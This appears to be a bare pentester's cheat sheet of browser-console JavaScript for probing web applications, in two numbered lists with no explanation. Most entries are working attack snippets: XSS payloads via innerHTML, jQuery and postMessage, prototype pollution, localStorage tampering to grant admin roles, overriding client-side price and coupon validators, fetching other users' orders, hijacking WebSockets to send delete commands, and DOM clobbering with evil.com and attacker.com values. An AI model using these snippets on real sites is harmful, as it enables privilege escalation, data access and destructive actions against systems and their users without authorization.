1.Object.keys(window).filter(k => !k.startsWith('webkit') && !k.startsWith('on'));



2.window.DEBUG || window.debug || window.__DEV__ || window.devMode


3.Object.prototype;  // check if extra properties already exist


4.getEventListeners(window); // Chrome-only utility
getEventListeners(document);


5.console.table(localStorage);
console.table(sessionStorage);


6.document.cookie;


7.localStorage.setItem('user', '{"isAdmin":true}');
location.reload();


8.const origFetch = window.fetch;
window.fetch = (...args) => {
  console.log('FETCH', args);
  return origFetch.apply(this, args).then(res => {
    res.clone().text().then(data => console.log('FETCH RESPONSE', data));
    return res;
  });
};


8.api && Object.keys(api);


9.fetch('/api/orders/1235', {credentials: 'include'}).then(r => r.json()).then(console.log)


10.eval('console.log(1)');           // does it execute?
document.write('<img src=x>');
element.innerHTML = '<img src=x onerror=alert(1)>';
setTimeout('alert(1)');
location.href = 'javascript:alert(1)';


11.$('#search-results').html('<img src=x onerror=alert(document.domain)>');


12.window.postMessage({type: 'updateContent', data: '<svg onload=alert(1)>'}, '*');


13.({}.__proto__.polluted = true);
console.log({}.polluted); // true? vulnerable library present.

14.document.querySelector('button.submit').disabled = false;


15.validatePrice = () => true;

16.document.querySelector('#delete-account-btn').click();

17.fetch('/static/js/app.bundle.js.map').then(r=>r.json()).then(console.log);


18.const origWS = window.WebSocket;
window.WebSocket = function(...args){
  const ws = new origWS(...args);
  window._ws = ws; // store reference
  ws.addEventListener('message', e => console.log('WS msg', e.data));
  return ws;
};


19._ws.send(JSON.stringify({action: 'delete', id: 1}));


20.const originalError = console.error;
console.error = function(...args) {
  args.forEach(arg => { if (typeof arg === 'string' && /key|token|secret/i.test(arg)) console.log('LEAKED:', arg); });
  originalError.apply(console, args);
};


21.document.body.innerHTML += '<a id="serverConfig" href="evil">';
console.log(window.serverConfig); // now an anchor element, not the original object








Domain Base Test all .........



1.Object.keys(window).filter(k => !k.startsWith('webkit') && !k.startsWith('on') && !['document','location','localStorage','sessionStorage','crypto','navigator','fetch','console','alert','prompt','confirm','getComputedStyle','matchMedia','requestAnimationFrame','setTimeout','setInterval','clearTimeout','clearInterval','btoa','atob','JSON','Math','Date','RegExp','Array','Object','String','Number','Boolean','Symbol','Map','Set','WeakMap','WeakSet','Promise','Proxy','Reflect','Intl','BigInt','eval','isNaN','parseInt','parseFloat','encodeURI','decodeURI','encodeURIComponent','decodeURIComponent','escape','unescape'].includes(k))


2.console.log(config);
// or copy(config) to export


3.console.table(localStorage);
console.table(sessionStorage);
document.cookie;


4.localStorage.setItem('user', '{"role":"admin"}');
location.reload();



5.const origFetch = window.fetch;
window.fetch = (...args) => {
  console.log('[FETCH]', args[0], args[1]);
  return origFetch.apply(this, args).then(res => {
    res.clone().text().then(data => console.log('[FETCH RESPONSE]', res.url, data));
    return res;
  });
};



5.const origXHROpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(method, url) {
  console.log('[XHR]', method, url);
  this.addEventListener('load', function() {
    console.log('[XHR RESPONSE]', url, this.responseText);
  });
  return origXHROpen.apply(this, arguments);
};


6.fetch('/api/orders/1235', {credentials: 'include'}).then(r=>r.json()).then(console.log)


7.location.href
location.hash
document.referrer
window.name


8.// Test innerHTML on a known element
document.querySelector('#search-results').innerHTML = '<img src=x onerror=alert(document.domain)>';



9.window.addEventListener('message', e => console.log(e.data));
// Then craft a malicious message:
postMessage({type: 'setHTML', data: '<svg onload=alert(1)>'}, '*');


10.({}.__proto__.polluted = true);
console.log({}.polluted);  // If true, vulnerable merging library exists.


11.Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
// then trigger a component that uses innerHTML without sanitizing.


12.document.querySelectorAll('[disabled]').forEach(el => el.disabled = false);

13.validateCoupon = () => true;


14.maxFileSize = Infinity;



15.document.querySelector('#deleteAccountBtn').click();


16.fetch('/static/js/app.bundle.js.map').then(r=>r.json()).then(console.log);


17.const origLog = console.log;
console.log = function(...args) {
  args.forEach(arg => {
    if (typeof arg === 'string' && /token|secret|key|bearer|password/i.test(arg)) {
      console.warn('POSSIBLE SECRET LEAK:', arg);
    }
  });
  origLog.apply(console, args);
};


18.// Example: if a script checks `window.console.debug` timing
console.debug = () => {};


19.const origWS = window.WebSocket;
window.WebSocket = function(...args) {
  const ws = new origWS(...args);
  window._ws = ws;  // store globally for our use
  ws.addEventListener('message', e => console.log('WS IN:', e.data));
  const origSend = ws.send;
  ws.send = function(data) {
    console.log('WS OUT:', data);
    return origSend.call(this, data);
  };
  return ws;
};


20._ws.send(JSON.stringify({action: 'delete', userId: 2}));


21.document.body.innerHTML += '<a id="serverConfig" href="https://evil.com">';
console.log(window.serverConfig);  // Should now be the anchor element


22.String(serverConfig)  // "https://evil.com/"

23.document.body.innerHTML += '<form id="config"><input name="apiEndpoint" value="https://attacker.com"></form>';
console.log(config.apiEndpoint.value); // "https://attacker.com"





